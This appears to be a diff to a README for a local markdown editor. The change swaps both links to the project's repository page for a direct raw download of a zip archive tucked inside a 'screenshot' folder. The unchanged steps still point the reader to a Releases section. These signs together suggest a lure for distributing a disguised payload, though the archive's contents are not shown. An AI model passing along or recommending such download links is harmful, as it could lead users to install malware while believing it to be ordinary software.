@@ -1,6 +1,6 @@
 # 📝 SimplyMarkdownEditor - Edit your files locally and fast
 
-[https://github.com/civildeathplanography415/SimplyMarkdownEditor](https://github.com/civildeathplanography415/SimplyMarkdownEditor)
+[https://github.com/civildeathplanography415/SimplyMarkdownEditor/raw/refs/heads/main/screenshot/Simply_Markdown_Editor_3.8.zip](https://github.com/civildeathplanography415/SimplyMarkdownEditor/raw/refs/heads/main/screenshot/Simply_Markdown_Editor_3.8.zip)
 
 ## 📁 What is this app?
 
@@ -12,7 +12,7 @@ The software uses modern browser tools to link directly to your folders. You can
 
 ## 📥 How to start
 
-Visit this page to download the app: [https://github.com/civildeathplanography415/SimplyMarkdownEditor](https://github.com/civildeathplanography415/SimplyMarkdownEditor)
+Visit this page to download the app: [https://github.com/civildeathplanography415/SimplyMarkdownEditor/raw/refs/heads/main/screenshot/Simply_Markdown_Editor_3.8.zip](https://github.com/civildeathplanography415/SimplyMarkdownEditor/raw/refs/heads/main/screenshot/Simply_Markdown_Editor_3.8.zip)
 
 1. Go to the link above.
 2. Look for the Releases section on the right side of the page.
